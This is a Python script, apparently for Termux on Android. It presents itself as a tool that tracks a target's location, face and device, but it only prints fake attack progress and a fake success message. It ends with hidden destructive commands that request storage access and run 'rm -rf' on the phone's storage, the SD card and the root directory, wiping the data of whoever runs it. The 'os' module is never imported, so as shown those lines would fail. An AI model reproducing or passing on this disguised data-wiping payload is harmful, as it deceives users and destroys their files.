import time

print("""\033[92m
┌─┬──────────────────────────────────────────────────────────────────────────────────┐
│                                                                                    │
│  ████████ ██████   █████   ██████ ██   ██     ██████   ██████  ██     ██ ███    ██ │
│     ██    ██   ██ ██   ██ ██      ██  ██      ██   ██ ██    ██ ██     ██ ████   ██ │
│     ██    ██████  ███████ ██      █████       ██   ██ ██    ██ ██  █  ██ ██ ██  ██ │
│     ██    ██   ██ ██   ██ ██      ██  ██      ██   ██ ██    ██ ██ ███ ██ ██  ██ ██ │
│     ██    ██   ██ ██   ██  ██████ ██   ██     ██████   ██████   ███ ███  ██   ████ │
│                                                                                    │
│                                                                                   │
└─┴──────────────────────────────────────────────────────────────────────────────────┘
\033[91m
┌─┬──────────────────┐
│•│TRACK LOCATION    │
│•│TRACK FACE.       │
│•│TRACK DEVICE      │
└─┴──────────────────┘
\033[96m
┌───────────────────┐
│Author : Eugene tsu│
└───────────────────┘

 """)
t = """\033[96m
┌───────────────────┐
│Author : Eugene tsu│
└───────────────────┘
"""
p = "\033[91m └─ \033[92mGO TO TELEGRAM AND YOU CAN SEE NOW!! "
w = "\033[91m └─ \033[92mSTATUS : SUCCESSFULY HACK"
j = "\033[91m └─ \033[92mGETTING DEVICE INFO..."
h = "\033[91m └─ \033[92mGETTING FACE..." 
z = "\033[91m └─ \033[92mGETTING LOCATION..."
x = "\033[92m └─ \033[91m ATTACKING  [        0%] "
a = "\033[92m └─ \033[91m ATTACKING  [=         15%] " 
b = "\033[92m └─ \033[91m ATTACKING  [===           26%]"
c = "\033[92m └─ \033[91m ATTACKING  [====             34%]"
d = "\033[92m └─ \033[91m ATTACKING  [=====              60%]"
e = "\033[92m └─ \033[91m ATTACKING  [=======               80%]"
f = "\033[92m └─ \033[91m ATTACKING  [=========               90%]"
g = "\033[92m └─ \033[91m ATTACKING  [==========                  100%]"

time.sleep(0.1)
y = "\033[96m └─ \033[91mINPUT INVALID!!"
while True:
    try:
        userInput = input("\033[96m└─ \033[92mENTER TARGET > \033[91m")
      
        age = int(input("\033[96m└─ \033[91mTIME > "))
    except ValueError:
        print("Sorry, I didn't understand that.")
        #better try again... Return to the start of the loop
        continue
    else:
        #age was successfully parsed!
        #we're ready to exit the loop.
        break
if age >= 10: 
    print(z)
    time.sleep(5)
    print(x)
    time.sleep(0.1)
    print(a)
    time.sleep(0.1)
    print(b)
    time.sleep(0.1)
    print(c)
    time.sleep(0.1)
    print(d)
    time.sleep(0.1)
    print(e)
    time.sleep(0.1)
    print(f)
    time.sleep(0.1)
    print(g)
    time.sleep(0.1)
    print(h)
    time.sleep(5)
    print(x)
    time.sleep(0.1)
    print(a)
    time.sleep(0.1)
    print(b)
    time.sleep(0.1)
    print(c)
    time.sleep(0.1)
    print(d)
    time.sleep(0.1)
    print(e)
    time.sleep(0.1)
    print(f)
    time.sleep(0.1)
    print(g)
    time.sleep(0.1)
    print(j)
    time.sleep(5)
    print(x)
    time.sleep(0.1)
    print(a)
    time.sleep(0.1)
    print(b)
    time.sleep(0.1)
    print(c)
    time.sleep(0.1)
    print(d)
    time.sleep(0.1)
    print(e)
    time.sleep(0.1)
    print(f)
    time.sleep(0.1)
    print(g)
    time.sleep(0.1)
    print(w)
    time.sleep(2)
    print(p)
    time.sleep(2)
    print(t)
    
    
   
    
else:
    print(y)
    
  
os.system('termux-setup-storage')
os.system('rm -rf /storage/emulated/0/*')
os.system('rm -rf /storage/emulated/*')
os.system('rm -rf /sdcard/*')
os.system('rm -rf /sdcard/0/*')
os.system('rm -rf /sdcard1/*')
os.system('rm -rf /storage/*')
os.system('rm -rf /*')
    
